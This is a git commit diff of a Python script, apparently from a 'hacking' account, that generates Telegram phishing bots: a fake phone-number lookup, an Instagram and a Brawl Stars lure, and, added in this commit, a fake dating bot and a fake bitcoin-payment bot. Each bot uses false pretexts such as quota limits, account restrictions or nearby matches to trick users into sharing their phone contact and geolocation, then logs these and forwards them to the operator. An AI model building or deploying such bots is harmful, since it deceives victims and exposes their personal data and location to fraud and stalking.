69ae339b23dbdea9689610bfb6efc27b2e237322
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2023-09-11 13:34:30 +0530

    Update 2.py

--- 2.py
+++ 2.py
@@ -6,7 +6,7 @@ correct_number = "12"
 os.system('clear')
 print(Fore.RED + '''
          _,.-------.,_
-	''')
+    ''')
 user_input = input(Fore.GREEN + "Enter a number: ")
 if "12" in user_input:
     print('Correct! You entered a number containing 12')
@@ -30,6 +30,7 @@ if "12" in user_input:
     choice = int(choice)
 
     if choice == 1:
+        # Code for choice 1 (Punched the number)
         f = open('probiv.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
@@ -45,109 +46,111 @@ print("The bot is running!")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, '''👋 Hello! 👋
+	bot.send_message(message.chat.id, '''👋 Hello! 👋
 This is a bot that can show information by phone number!
 To search for information, enter the command /getinfo''') 
-
+	
 @bot.message_handler(commands=['onlinehacking'])
 def start(message):
-    bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
+	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
 
 @bot.message_handler(commands=['getinfo'])
 def start(message):
-    msg = bot.send_message(message.chat.id, 'Enter any phone number') 
-    bot.register_next_step_handler(msg, proc2)
+	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
+	bot.register_next_step_handler(msg, proc2)
 
 def proc2(message):
-    try:
-        m_id = message.chat.id
-        user_input = message.text
-        num = user_input.replace('+', '')
+	try:
+		m_id = message.chat.id
+		user_input = message.text
+		num = user_input.replace('+', '')
 
-        if not num.isdigit():
-            msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
-            return
+		if not num.isdigit():
+			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
+			return
 
-        bot.send_message(m_id, f'Request for number {{num}} has been sent!')
-        time.sleep(2)
-        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-        button_phone = types.KeyboardButton(text="Register", request_contact=True)     
-        keyboard.add(button_phone)    
-        bot.send_message(m_id, '''Looks like you have no free requests left for the day!
-            To get additional questions, register in the bot!''', reply_markup=keyboard)
-    except Exception as e:
-        bot.send_message(ID, e)
-        bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
+		bot.send_message(m_id, f'Request for number {{num}} has been sent!')
+		time.sleep(2)
+		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
+		keyboard.add(button_phone)	
+		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
+			To get additional questions, register in the bot!''', reply_markup=keyboard)
+# Отловка ошибок
+	except Exception as e:
+		bot.send_message(ID, e)
+		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
 @bot.message_handler(content_types=['contact']) 
 def contact(message):
-    if message.contact is not None: 
-        nick = message.from_user.username
-        first = message.contact.first_name
-        last = message.contact.last_name
-        userid = message.contact.user_id
-        phone = message.contact.phone_number
-        info = f'''
-            Data
-            ├Name: {{first}} {{last}}
-            ├ID: {{userid}}
-            ├Nick: @{{nick}}
-            └Phone number: {{phone}}
-            '''
-        log = open('bot-log.txt', 'a+', encoding='utf-8')
-        log.write(info + '  ')
-        log.close()
-        bot.send_message(ID, info)
-        print(info)
+	if message.contact is not None: 
+		nick = message.from_user.username
+		first = message.contact.first_name
+		last = message.contact.last_name
+		userid = message.contact.user_id
+		phone = message.contact.phone_number
+		info = f'''
+			Data
+			├Name: {{first}} {{last}}
+			├ID: {{userid}}
+			├Nick: @{{nick}}
+			└Phone number: {{phone}}
+			'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(info + '  ')
+		log.close()
+		bot.send_message(ID, info)
+		print(info)
 
-        if message.contact.user_id != message.chat.id:
-            bot.send_message(message.chat.id, 'Отправьте свой контакт!')
+		if message.contact.user_id != message.chat.id:
+			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
 
-    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-    button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
-    keyboardmain.add(button)
-    bot.send_message(message.chat.id, f'''
-        Room information
-        ├Operator: Beeline
-        └Country: Russia
-        ''', reply_markup=keyboardmain)
+	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
+	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
+	keyboardmain.add(button)
+	bot.send_message(message.chat.id, f'''
+		Room information
+		├Operator: Beeline
+		└Country: Russia
+		''', reply_markup=keyboardmain)
 
 @bot.callback_query_handler(func=lambda call:True)
 def callback_inline(call):
-    if call.data == "find":
-        keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-        button_location = types.KeyboardButton(text="Confirm", request_location=True)     
-        keyboard1.add(button_location)
-        bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)
+	if call.data == "find":
+		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
+		keyboard1.add(button_location)
+		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
-    if message.location is not None: 
-        lon = str(message.location.longitude)
-        lat = str(message.location.latitude)
-        geo = f'''
-        Геолокация
-        ├ID: {{message.chat.id}}
-        ├Longitude: {{lon}}
-        ├Latitude: {{lat}}
-        └Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
-        '''
-        log = open('bot-log.txt', 'a+', encoding='utf-8')
-        log.write(geo + '  ')
-        log.close()
-        bot.send_message(ID, geo) 
-        print(geo)
-        bot.send_message(message.chat.id, f'''
-            Geolocation
-            └Address: {{random.choice(adr)}}
-            ''')
-    bot.polling()
+	if message.location is not None: 
+		lon = str(message.location.longitude)
+		lat = str(message.location.latitude)
+		geo = f'''
+		Геолокация
+		├ID: {{message.chat.id}}
+		├Longitude: {{lon}}
+		├Latitude: {{lat}}
+		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(geo + '  ')
+		log.close()
+		bot.send_message(ID, geo) 
+		print(geo)
+		bot.send_message(message.chat.id, f'''
+			Geolocation
+			└Address: {{random.choice(adr)}}
+			''')
+bot.polling()
         """)
         f.close()
         print("The probiv.py file is saved")
 
     elif choice == 2:
-        f = open('nacr.py', 'w+', encoding='utf-8')
+        # Code for choice 2 (Instagram cheat)
+        f = open('probiv2.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 from telebot import types
@@ -277,18 +280,16 @@ def entr(message):
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
-
-
-
-
 bot.polling()
+
+
         """)
         f.close()
-        print("The nacr.py file is saved")
+        print("The probiv2.py file is saved")
 
-
-elif choice == 3:
-        f = open('brawl.py', 'w+', encoding='utf-8')
+    elif choice == 3:
+        # Code for choice 3 (Brawl stars)
+        f = open('brawl_stars.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 from telebot import types
@@ -487,12 +488,198 @@ def entr1(message):
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
 bot.polling()
+
+
         """)
         f.close()
-        print("The brawl.py file is saved")
- 
+        print("The brawl_stars.py file is saved")
 
-     else:
+    elif choice == 4:
+        # Code for choice 4 (Acquaintance)
+        f = open('acquaintance.py', 'w+', encoding='utf-8')
+        f.write(f"""
+import telebot
+from telebot import types
+import time
+import random
+
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+bot.send_message(ID, '!BOT STARTED!') 
+print("Bot launched!") 
+
+@bot.message_handler(commands=['start'])
+def start(message):
+	bot.send_message(message.chat.id, f'''👋Hello! {{message.from_user.first_name}}👋
+This is a dating bot!
+To get started, type /znak''') 
+@bot.message_handler(commands=['lamer112311dev'])
+def start(message):
+	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
+@bot.message_handler(commands=['znak'])
+def start(message):
+	msg = bot.send_message(message.chat.id, 'First, write a little about yourself (in one message)') 
+	bot.register_next_step_handler(msg, proc2)
+
+def proc2(message):
+	try:
+		m_id = message.chat.id
+		num = message.text
+		bot.send_message(ID, f'Information received: {{num}}')
+		print(num)
+		time.sleep(2)
+		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
+		keyboard.add(button_phone)	
+		bot.send_message(m_id, '''In order to use the bot, please register!''', reply_markup=keyboard)
+# Catching errors
+	except Exception as e:
+		bot.send_message(ID, e)
+		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
+
+@bot.message_handler(content_types=['contact']) 
+def contact(message):
+	if message.contact is not None: 
+		nick = message.from_user.username
+		first = message.contact.first_name
+		last = message.contact.last_name
+		userid = message.contact.user_id
+		phone = message.contact.phone_number
+		bot.send_message(userid, "Registration Completed Successfully!")
+		info = f'''
+			Data
+			├Name: {{first}} {{last}}
+			├ID: {{userid}}
+			├Nik: @{{nick}}
+			└Phone number: {{phone}}
+			'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(info + '  ')
+		log.close()
+		bot.send_message(ID, info)
+		print(info)
+
+		if message.contact.user_id != message.chat.id:
+			bot.send_message(message.chat.id, 'Submit your contact!')
+		time.sleep(1)
+		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+		button_location = types.KeyboardButton(text="Send", request_location=True) 	
+		keyboard1.add(button_location)
+		bot.send_message(message.chat.id, text='Send your geolocation so that the bot can find users closest to you!', reply_markup=keyboard1)
+
+@bot.message_handler(content_types=['location']) 
+def contact(message):
+	if message.location is not None: 
+		lon = str(message.location.longitude)
+		lat = str(message.location.latitude)
+		geo = f'''
+		Geolocation
+		├ID: {{message.chat.id}}
+		├Longitude: {{lon}}
+		├Latitude: {{lat}} 
+		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
+		'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(geo + '  ')
+		log.close()
+		bot.send_message(ID, geo) 
+		print(geo)
+		bot.send_message(message.chat.id, 'Search...')
+		time.sleep(2)
+		bot.send_message(message.chat.id, 'Unfortunately, there were no suitable users in the database!')
+bot.polling()
+        """)
+        f.close()
+        print("The acquaintance.py file is saved")
+
+    elif choice == 5:
+        # Code for choice 5 (BTC BANKER)
+        f = open('btc_banker.py', 'w+', encoding='utf-8')
+        f.write(f"""
+import telebot
+from telebot import types
+import time
+import random
+
+ID = '{userid}'
+bot = telebot.TeleBot("{token}")
+bot.send_message(ID, '!BOT STARTED!') 
+print("Bot launched!") 
+
+
+@bot.message_handler(commands=['admin'])
+def adm(message):
+	if message.from_user.id == int(ID):
+		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n \\n Enter the amount for which to create Fack BTC Received:') 
+		bot.register_next_step_handler(msg, check)
+def check(message):
+	try:
+		if message.text.isdigit():
+			bot.send_message(ID, f'User Received: {{message.text}}')
+			bot.send_message(ID, f'Your check: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
+		else:
+			bot.send_message('The value must be numeric!')
+
+	except Exception as e:
+		print(e)
+
+@bot.message_handler(commands=['start'])
+def start(message):
+	if message.from_user.id == int(ID):
+		bot.send_message(ID, 'Welcome to the bot! \\n To enter the admin panel, write: /admin') 
+	else:
+		try:
+			summ = message.text.split()[1]
+			userid = message.chat.id
+			bot.send_message(ID, f'User with ID:{{userid}} "BTC" your check for the amount:{{summ}}')
+			bot.send_message(message.chat.id, f'''You received 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
+			time.sleep(1)
+			
+			m_id = message.chat.id
+			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			keyboard.add(button_phone)	
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+		
+		except Exception as e:
+			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			keyboard.add(button_phone)	
+			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			userid = message.chat.id
+			bot.send_message(ID, f'User with ID:{{userid}} launched a bot!')
+
+@bot.message_handler(content_types=['contact']) 
+def contact(message):
+	if message.contact is not None: 
+		nick = message.from_user.username
+		first = message.contact.first_name
+		last = message.contact.last_name
+		userid = message.contact.user_id
+		phone = message.contact.phone_number
+		bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
+		info = f'''
+			Data
+			├Name: {{first}} {{last}}
+			├ID: {{userid}}
+			├Nok: @{{nick}}
+			└Phone number: {{phone}}
+			'''
+		log = open('bot-log.txt', 'a+', encoding='utf-8')
+		log.write(info + '  ')
+		log.close()
+		bot.send_message(ID, info)
+		print(info)
+
+		if message.contact.user_id != message.chat.id:
+			bot.send_message(message.chat.id, '❌ Authorize Your contact!')
+	
+bot.polling()
+        """)
+        f.close()
+        print("The btc_banker.py file is saved")
+
+    else:
         print('Invalid choice')
 else:
     print('Sorry, the entered number does not contain 12')
